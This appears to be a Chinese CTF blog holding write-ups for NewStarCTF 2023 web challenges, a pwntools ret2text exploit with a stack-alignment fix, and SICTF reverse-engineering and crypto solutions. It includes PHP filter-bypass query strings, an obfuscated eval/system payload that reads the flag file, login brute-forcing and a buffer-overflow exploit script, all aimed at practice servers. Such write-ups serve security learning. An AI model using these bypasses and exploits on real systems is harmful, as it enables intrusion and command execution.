<h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?ctf=1 HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:2866</span><br><span class="line">User-Agent: NewStarCTF2023</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Origin: newstarctf.com</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: newstarctf.com</span><br><span class="line">Cookie: power=ctfer</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">secret=n3wst4rCTF2023g00000d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5937a957-5910-4eec-91c3-84e1a8911d97&#125; </span><br></pre></td></tr></table></figure>



<h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/247503.html">https://www.freebuf.com/articles/network/247503.html</a></p>
<p>根据提示，用空参数的时候flask就报错了，就把flag泄露出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://98e6da3a-09a5-40e7-bac4-776d4dd52435.node4.buuoj.cn:81/?number1=1&amp;number2=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>报错的地方在这里，空参数的时候request.args.get会返回’’ 然后int转型就会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num1 = request.args.get(&quot;number1&quot;);</span><br><span class="line">num2 = request.args.get(&quot;number2&quot;);</span><br><span class="line"></span><br><span class="line">return &quot;not ssti,flag in source code~&quot;+str(int(num1)+int(num2))</span><br></pre></td></tr></table></figure>



<h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>level1用0e绕过 level2传数组过去 level3传数组过去，level4加一个url编码is_numberic就识别不出来了，level5传一个符号就好了</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46145027/article/details/124514124">https://blog.csdn.net/qq_46145027/article/details/124514124</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/12342124.html">https://www.cnblogs.com/zhengna/p/12342124.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Primzahl/p/6018158.html">https://www.cnblogs.com/Primzahl/p/6018158.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://34cb9ad6-2b68-4fd9-a2fc-9a6698c8b0c5.node4.buuoj.cn:81/?key1=QNKCDZO&amp;key2=s878926199a&amp;key4[]=1&amp;key5=2024%20</span><br><span class="line"></span><br><span class="line">post: key3[]=@&amp;flag5[]=@</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3a48262b-ac99-4f09-85ed-9ac23cec050e&#125;</span><br></pre></td></tr></table></figure>



<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>password爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">TARGET_PREFIX = <span class="string">&quot;c4d038&quot;</span></span><br><span class="line">MAX_LENGTH = <span class="number">6</span></span><br><span class="line">CHARSET = string.ascii_lowercase + string.digits</span><br><span class="line">THREADS = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_strings</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">return</span> itertools.product(CHARSET, repeat=length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_string</span>(<span class="params">start, end</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> itertools.islice(generate_strings(MAX_LENGTH), start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(<span class="string">&#x27;&#x27;</span>.join(s)).startswith(TARGET_PREFIX):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(s)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_bruteforce</span>():</span><br><span class="line">    total_combinations = <span class="built_in">len</span>(CHARSET) ** MAX_LENGTH</span><br><span class="line">    step = total_combinations // THREADS</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):</span><br><span class="line">        start = i * step</span><br><span class="line">        end = (i + <span class="number">1</span>) * step <span class="keyword">if</span> i != THREADS - <span class="number">1</span> <span class="keyword">else</span> total_combinations</span><br><span class="line">        t = threading.Thread(target=check_string, args=(start, end))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># threaded_bruteforce()</span></span><br><span class="line">    <span class="built_in">print</span>(md5(<span class="string">&quot;apofox&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>非法变量名的转换 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16804708.html">https://www.cnblogs.com/meng-han/p/16804708.html</a></p>
<p>phpinfo发现可以用拼接函数的方式绕过 <a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117469219">https://blog.csdn.net/LYJ20010728/article/details/117469219</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=apofox&amp;e[v.a.l=(sy.(st).em)(&quot;ca&quot;.&quot;t /fla&quot;.&quot;g&quot;);</span><br></pre></td></tr></table></figure>



<h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>注册个账户后登录时候有个302的包显示这个，这个是个假的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 恭喜你找到flag --&gt;</span><br><span class="line">&lt;!-- flag 为下方链接中视频简介第7行开始至第10行的全部小写字母和数字 --&gt;</span><br><span class="line">&lt;!-- https://b23.tv/BV1SD4y1J7uY --&gt;</span><br><span class="line">&lt;!-- 庆祝一下吧！ --&gt;</span><br></pre></td></tr></table></figure>

<p>后面尝试去爆破admin,用burp中的brute forcer然后套md5爆破，爆破出来的密码是000000，然后有个302的包里面有flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3e7dd426-5475-4789-9605-b1fac334af0f&#125;</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 4285 words, 14 min 17 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a></h3></div><div class="post-content"><div class="card"><p><p>今天看一个ret2text的题目的时候，遇到了exp本地不通，远程通的奇怪问题，题目是这样的</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663341172.png" class="" title="uTools_1695663341172">

<p>有个backdoor函数是这样的</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663362912.png" class="" title="uTools_1695663362912">

<p>exp是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./Intruduce&#x27;</span>)</span><br><span class="line">p = process()</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">backd00r=<span class="number">0x4011B6</span></span><br><span class="line">payload+=p64(backd00r)</span><br><span class="line">s=p.recvline() ; <span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">char=p.recv(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gdb调试了一下发现在call system的时候卡在了这个xmm寄存器里</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663133026.png" class="" title="uTools_1695663133026">

<p>搜索了一下，在这里找到了解决方法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/107695261">https://blog.csdn.net/fjh1997/article/details/107695261</a></p>
<p>发现是glibc &gt;&#x3D; 2.27的时候 system函数里面会调用xmm寄存器，xmm寄存器要求16字节对齐，远程的环境应该是&lt;2.27的所以可以直接打通，然后我本地的glibc版本是2.35的，所以会因为xmm寄存器内存对齐的原因导致exp打不通，只需要少push一个地址，内存就对齐了</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695665501265.png" class="" title="uTools_1695665501265">

<p>一开始我是用4011B6这个地址，后面换成了4011BB就对齐了，然后本地就通了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./Intruduce&#x27;</span>)</span><br><span class="line">p = process()</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">backd00r=<span class="number">0x4011BB</span> <span class="comment"># old address 4011B6</span></span><br><span class="line">payload+=p64(backd00r)</span><br><span class="line">s=p.recvline() ; <span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">char=p.recv(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-26</span><span class="leancloud_visitors"></span><span>About 348 words, 1 min 9 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/sictf2023r2/">sictf2023</a></h3></div><div class="post-content"><div class="card"><p><h3 id="附件-https-github-com-nyyyddddn-ctf-tree-main-Sictf2023-20-23Round-202"><a href="#附件-https-github-com-nyyyddddn-ctf-tree-main-Sictf2023-20-23Round-202" class="headerlink" title="附件 https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202"></a>附件 <a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202">https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202</a></h3><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h2><p>电脑上的pycdc出问题了，就找个在线的</p>
<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/string/pyc-compile-decompile">https://www.lddgo.net/string/pyc-compile-decompile</a></p>
<p>print(‘SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}’)</p>
<h2 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h2><p>rc4加解密，写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  <span class="comment"># Swap values</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  </span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        output.append(byte ^ K)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line">key = [<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;SIFLAG&quot;</span>]</span><br><span class="line">v18_bytes = (<span class="number">0x47CF225A0ED32730</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">ciphertext_v19 = [<span class="number">71</span>, <span class="number">107</span>, <span class="number">11</span>, <span class="number">229</span>, <span class="number">141</span>, <span class="number">83</span>, <span class="number">186</span>, <span class="number">153</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">7</span>]</span><br><span class="line">v20_bytes = (<span class="number">0x9F88FE10771C0107</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">full_ciphertext_27 = <span class="built_in">list</span>(v18_bytes) + ciphertext_v19 + <span class="built_in">list</span>(v20_bytes)</span><br><span class="line"></span><br><span class="line">decrypted_full_combined = rc4(key, full_ciphertext_27)</span><br><span class="line">decrypted_full_combined_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> decrypted_full_combined])</span><br><span class="line"><span class="built_in">print</span>(decrypted_full_combined_string)</span><br></pre></td></tr></table></figure>

<p>SICTF{wow_you_get_the_flag}</p>
<h2 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">strcpy(Str2, <span class="string">&quot;F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9&quot;</span>);</span><br><span class="line"></span><br><span class="line">char *sub_411B30()</span><br><span class="line">&#123;</span><br><span class="line">  char *result; // eax</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C0F5);</span><br><span class="line">  j_strcpy(&amp;Destination, <span class="string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  result = (char *)IsDebuggerPresent();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> j_strcpy(&amp;Destination, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>base64换一下上面的索引表就解出来了</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>SICTF{base64_and_antidebugger}</p>
<h2 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h2><p>这个出题人怎么对base64情有独钟</p>
<p>pyinstaller打包的exe,我找了几个提取pyc的项目，就这个比较好用</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pyinstxtractor/pyinstxtractor-ng/releases/tag/2023.08.20">https://github.com/pyinstxtractor/pyinstxtractor-ng/releases/tag/2023.08.20</a></p>
<p>然后把111.pyc 反编译一下</p>
<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/string/pyc-compile-decompile">https://www.lddgo.net/string/pyc-compile-decompile</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line">BASE64_CHARS = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">for</span> x <span class="keyword">in</span> <span class="number">.0</span>:</span><br><span class="line"><span class="built_in">format</span>(x, <span class="string">&#x27;08b&#x27;</span>))(data))</span><br><span class="line">    padding = <span class="built_in">len</span>(binary_str) % <span class="number">24</span></span><br><span class="line">    <span class="keyword">if</span> padding != <span class="number">0</span>:</span><br><span class="line">        binary_str += <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - padding)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">6</span>):</span><br><span class="line">        group = binary_str[i:i + <span class="number">6</span>]</span><br><span class="line">        decimal_val = <span class="built_in">int</span>(group, <span class="number">2</span>)</span><br><span class="line">        result += BASE64_CHARS[decimal_val]</span><br><span class="line">    padding_count = (<span class="number">4</span> - <span class="built_in">len</span>(result) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">    result += <span class="string">&#x27;=&#x27;</span> * padding_count</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>).encode()</span><br><span class="line">encoded_data = base64_encode(data)</span><br><span class="line"><span class="built_in">print</span>(encoded_data)</span><br><span class="line"><span class="keyword">if</span> encoded_data == <span class="string">&#x27;U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;True!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个是base64换表，用这个解密</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>SICTF{8e0d358d-8b9d-4866-9b02-6749b07ad09a}拿到flag</p>
<h2 id="javacode"><a href="#javacode" class="headerlink" title="javacode"></a>javacode</h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-古典大杂烩"><a href="#签到-古典大杂烩" class="headerlink" title="[签到]古典大杂烩"></a>[签到]古典大杂烩</h2><p>emjoy编码，用这个解码<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p>然后就不知道什么编码了，在搜索ctf编码识别的时候找到了这个项目</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ciphey/Ciphey">https://github.com/Ciphey/Ciphey</a> 用这个项目解出了flag，这是docker版本的使用<a target="_blank" rel="noopener" href="https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey">https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey</a></p>
<p>SICTF{fe853b49-8730-462e-86f5-fc8e9789f077}</p>
<h2 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h2><p>有三组n c，然后e比较小，用中国剩余定理求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用中国剩余定理求解同余方程，aList：余数，mList：模数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">aList, mList</span>):</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mList:</span><br><span class="line">        M = M * i  <span class="comment"># 计算M = ∏ mi</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mList)):</span><br><span class="line">        Mi = M // mList[i]  <span class="comment"># 计算Mi</span></span><br><span class="line">        Mi_inverse = gmpy2.invert(Mi, mList[i])  <span class="comment"># 计算Mi的逆元</span></span><br><span class="line">        x += aList[i] * Mi * Mi_inverse  <span class="comment"># 构造x各项</span></span><br><span class="line">    x = x % M</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n1 = <span class="string">&quot;14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923&quot;</span></span><br><span class="line">    n2 = <span class="string">&quot;16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499&quot;</span></span><br><span class="line">    n3 = <span class="string">&quot;12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681&quot;</span></span><br><span class="line">    c1 = <span 